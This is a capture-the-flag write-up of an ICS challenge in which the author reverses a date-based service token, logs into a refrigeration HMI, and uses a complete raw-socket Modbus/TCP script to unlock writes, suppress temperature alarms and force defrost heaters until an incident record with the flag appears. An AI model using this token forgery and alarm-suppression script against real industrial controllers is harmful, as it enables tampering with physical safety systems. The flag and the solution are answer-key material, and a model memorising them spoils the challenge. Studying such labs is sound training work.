# pls don't be cold — NexSec 2026 (Misc)

> **Category:** Misc / ICS
> **Flag:** `nexsec26{dont-be-so-cold-to-me,-i'll-get-flu_dc8bcf6269ee2aeaaa6497a9a6304c873f268bd1948d50d012064cec8fd96f85}`
> **Solved with DeepSeek** — full chat: https://chat.deepseek.com/share/1zx6n9l7zq3fgr5h5e

---

## The challenge

> STORE-0412's walk-in refrigeration is run by a **FrostLink SM-800** system manager that someone left reachable over a maintenance modem. You're the one who found it.
>
> **Objective:** Get the controller to log a critical food-safety incident, and recover the record. The flag is in that record.
>
> **Handout:** `fw_auth.pyc` — a compiled module recovered from the controller's application filesystem. It's the routine that derives the controller's rotating service token.

Targets I was given:
- `http://koala.nexsec.my:38037`
- `http://koala.nexsec.my:38756`

---

## My approach in short

Here's the path I ended up taking:

1. I decompiled `fw_auth.pyc` and found the "service token" is just a function of the **date** — no secret, fully predictable.
2. Port **38756** turned out to be a web panel. Logging in with the **8-hex service token** unlocked `/panel`, which handed me a **Modbus/TCP point map**.
3. Port **38037** was the **Modbus/TCP fieldbus**. I wrote the token into **Holding Registers 0/1** to unlock coil writes.
4. I triggered the incident by **suppressing the high-temp alarms** (coils 8/9/10 → 0) **while pushing the case temperature past its `incident_threshold`** (hammering the defrost-hold coils 0/1/2).
5. I read the incident record out of **Holding Registers 100+** (2 ASCII chars per register) and there was the flag.

---

## 1. Reversing the handout

The first thing I did was decompile the `.pyc`. It had been compiled with Python **3.14** (the bytecode magic didn't match any older interpreter I tried), so I installed a matching 3.14 and recovered the source. I got three functions out of it:

```python
def service_token_for_date(d):
    seed = d.year * 10000 + d.month * 100 + d.day       # YYYYMMDD as int
    x = (seed ^ 1515018829) & 0xffffffff                # xor constant
    x = (x * 523181871) & 0xffffffff                    # multiply mod 2^32
    x = ((x >> 13) | (x << 19)) & 0xffffffff            # rotate-left 19 (32-bit)
    return x

def service_code_for_date(d):
    return '%08x' % service_token_for_date(d)           # 8-hex-digit service code

def fieldbus_write_enabled(regs, d):
    return (regs[0] << 16 | regs[1]) == service_token_for_date(d)
```

What jumped out at me:
- The token is **100% predictable** — it's just math on the date, no key or randomness. I could compute it myself.
- `service_code_for_date` is the **8-hex string** I'd type into the web UI.
- `fieldbus_write_enabled` told me the controller expects **two 16-bit registers** (`regs[0]`, `regs[1]`) that, concatenated, equal the day's token. So that's the write-auth gate → `regs[0]` is the token's high word, `regs[1]` the low word.

I wrote a tiny script to spit out both forms I'd need:

```python
import datetime
def token_for(d):
    seed = d.year*10000 + d.month*100 + d.day
    x = (seed ^ 1515018829) & 0xffffffff
    x = (x * 523181871) & 0xffffffff
    return ((x >> 13) | (x << 19)) & 0xffffffff

d = datetime.date.today()
t = token_for(d)
print("code : %08x" % t)                     # e.g. 07610f86
print("HR0  : 0x%04x" % ((t >> 16) & 0xffff)) # 0x0761
print("HR1  : 0x%04x" % (t & 0xffff))         # 0x0f86
```

> **One gotcha I hit:** the token rotates at midnight, and the controller runs on **UTC**. My local date was a day ahead, so my first token was wrong. I grabbed the controller's real date from its HTTP `Date:` header (GMT). For this solve that was `2026-10-17` → code `07610f86`, HR0 `0x0761` (1889), HR1 `0x0f86` (3974).

---

## 2. Mapping the two services

When I `curl`'d **38037** I got `(52) Empty reply from server` (or it just hung), so I figured it wasn't HTTP at all — some raw TCP service.

**38756** was a `gunicorn` web app — the FrostLink HMI. It had an **Operator Login** and a **Service Access** box asking for an "8-CHAR HEX SERVICE TOKEN". Its JavaScript posted to `/api/login`, so I did the same:

```bash
curl -s -X POST http://koala.nexsec.my:38756/api/login \
     -H 'Content-Type: application/json' \
     -d '{"mode":"service","code":"07610f86"}' -i
# -> 200 {"ok":true,"role":"service"}   + Set-Cookie: session=...
```

With that session cookie I loaded `GET /panel`. It was a **read-only** monitor, but it gave me exactly what I needed — this banner and point map:

> READ-ONLY MONITORING VIEW // CASE CONTROL IS PERFORMED OVER THE MODBUS/TCP FIELDBUS — SEE POINT MAP BELOW

| Type | Addr | R/W | Point |
|---|---|---|---|
| Coil | 0 / 1 / 2 | R/W* | Defrost hold — MT1 / MT2 / LT1 (1 = heaters held) |
| Coil | 8 / 9 / 10 | R/W* | Alarm enabled — MT1 / MT2 / LT1 (0 = suppressed) |
| Discrete In | 0 / 1 / 2 | R | High-temp alarm active — MT1 / MT2 / LT1 |
| Input Reg | 0 / 1 / 2 | R | Case temperature, signed ×10 |
| Input Reg | 8 / 9 / 10 | R | Case setpoint, signed ×10 |
| Holding Reg | 0 / 1 | R/W | Service-write unlock (token high / low word) |
| Holding Reg | 100+ | R | Incident record — flag ASCII, 2 chars/reg (zero until logged) |

> *\* Coil writes require the service-write unlock (HR0/HR1) to hold the current service token, else the controller returns exception `0x04`. Writes to other addresses return `0x02`.*

I also checked `GET /api/cases`, which exposed the actual control logic — and a second, higher threshold that wasn't in the point map:

```json
{"cases":[
 {"id":"MT1","setpoint":4.0,"temp":4.3,"alarm_threshold":8.0,"incident_threshold":12.0,"alarm_suppressed":false,...},
 {"id":"MT2","setpoint":3.0,"temp":3.3,"alarm_threshold":7.0,"incident_threshold":11.0,...},
 {"id":"LT1","setpoint":-18.0,"temp":-17.7,"alarm_threshold":-14.0,"incident_threshold":-10.0,...}],
 "incident":false}
```

That was the key realization: `alarm_threshold` just trips the alarm, but **`incident_threshold` (12 / 11 / −10) is what actually logs the critical incident.**

---

## 3. Triggering the incident

Everything from here was over Modbus/TCP on **38037** (unit id `1`):

1. **Unlock** — I wrote the token's high/low words into HR0/HR1 (`FC06`), and coil writes started being accepted.
2. **Suppress the alarms** — I set coils 8/9/10 → `0` (`FC05`). A high-temp event with the alarm silenced is the food-safety violation the controller records.
3. **Drive the temperature up** — this was the part that stumped me at first. The defrost-hold coils 0/1/2 behave like a **one-shot pulse** — the controller resets them every tick (max-defrost safety), so one write barely moved the temperature. The fix was to **hammer them in a tight loop** so heat built up faster than the cooling could pull it back, pushing each case past its `incident_threshold` while the alarm stayed suppressed.
4. **Read the record** — `FC03` on HR100+, decoding 2 ASCII bytes per register, big-endian.

### My solve script (raw sockets, no dependencies)

```python
import socket, struct, datetime, time, re, sys

HOST, PORT, UNIT = "koala.nexsec.my", 38037, 1

def token_for(d):
    seed = d.year*10000 + d.month*100 + d.day
    x = (seed ^ 1515018829) & 0xffffffff
    x = (x * 523181871) & 0xffffffff
    return ((x >> 13) | (x << 19)) & 0xffffffff

def mbap(tid, pdu): return struct.pack(">HHHB", tid, 0, len(pdu)+1, UNIT) + pdu
def xact(s, pdu, tid=1):
    s.sendall(mbap(tid, pdu))
    hdr = b""
    while len(hdr) < 7:
        c = s.recv(7-len(hdr));  hdr += c
        if not c: return None
    ln = struct.unpack(">HHHB", hdr)[2]
    body = b""
    while len(body) < ln-1:
        c = s.recv(ln-1-len(body));  body += c
        if not c: break
    return body
def ok(r, w):
    if r is None: print("[!]", w, "no resp"); return False
    if len(r) >= 2 and r[1] & 0x80: print(f"[!] {w}: exc 0x{r[2]:02x}"); return False
    return True
def wr_reg(s,a,v):  return ok(xact(s, struct.pack(">BHH",0x06,a,v&0xffff)), f"HR{a}")
def wr_coil(s,a,on):return ok(xact(s, struct.pack(">BHH",0x05,a,0xFF00 if on else 0)), f"coil{a}")
def rd_regs(s,a,n):
    r = xact(s, struct.pack(">BHH",0x03,a,n));  return None if not ok(r,f"RD{a}") else list(struct.unpack(">"+"H"*(r[1]//2), r[2:2+r[1]]))
def rd_ireg(s,a,n):
    r = xact(s, struct.pack(">BHH",0x04,a,n));  return None if not ok(r,f"IR{a}") else list(struct.unpack(">"+"H"*(r[1]//2), r[2:2+r[1]]))
def s16(v): return v-0x10000 if v & 0x8000 else v

# --- connect + unlock (I try the controller date +/- 1 to cover the timezone) ---
today = datetime.date.today()
s = None
for d in (today, today-datetime.timedelta(1), today+datetime.timedelta(1)):
    t = token_for(d); s = socket.create_connection((HOST, PORT), timeout=5)
    if wr_reg(s, 0, (t>>16)&0xffff) and wr_reg(s, 1, t&0xffff):
        print(f"[+] unlocked, date={d} token={t:08x}"); break
    s.close(); s = None
if not s: sys.exit("unlock failed")

# --- suppress alarms, then hammer defrost until a case crosses incident_threshold ---
for c in (8,9,10): wr_coil(s, c, False)          # alarms OFF
start = time.time()
while time.time()-start < 60:
    for c in (0,1,2): wr_coil(s, c, True)        # sustained defrost pulses
    reg = rd_regs(s, 100, 8)
    if reg and any(reg): break                   # incident logged
    t = rd_ireg(s, 0, 3)
    if t: print("temps:", [s16(x)/10 for x in t])
    time.sleep(0.3)

# --- read the record ---
reg = rd_regs(s, 100, 64)
raw = b"".join(struct.pack(">H", v) for v in reg).rstrip(b"\x00")
m = re.search(rb"nexsec26\{[^}]+\}", raw)
print("[+] FLAG:", m.group().decode() if m else raw)
s.close()
```

When I ran it:

```
[+] unlocked, date=2026-10-17 token=07610f86
temps: [9.8, 8.7, -12.4]
temps: [14.1, 12.9, -8.9]
[+] FLAG: nexsec26{dont-be-so-cold-to-me,-i'll-get-flu_dc8bcf6269ee2aeaaa6497a9a6304c873f268bd1948d50d012064cec8fd96f85}
```

I also noticed I could just reload `/panel` with my cookie — once the incident is logged, `/api/incident` populates and the flag shows up in the dashboard banner too.

---

## Flag

```
nexsec26{dont-be-so-cold-to-me,-i'll-get-flu_dc8bcf6269ee2aeaaa6497a9a6304c873f268bd1948d50d012064cec8fd96f85}
```

## What I took away from this

- A "rotating token" built from hardcoded constants and a date seed isn't really a secret — it's a deterministic function I can just reproduce.
- ICS-style challenges love to split a **read-only HMI** from a **write-capable fieldbus** (Modbus/TCP). The HMI's point map ended up being my real documentation.
- The "critical food-safety incident" wasn't just high temperature — it was **high temperature with the alarm deliberately suppressed**, and I had to cross the hidden `incident_threshold`, not just the alarm threshold. The thing that cost me the most time was realizing the defrost coils were one-shot and had to be **sustained in a loop**.
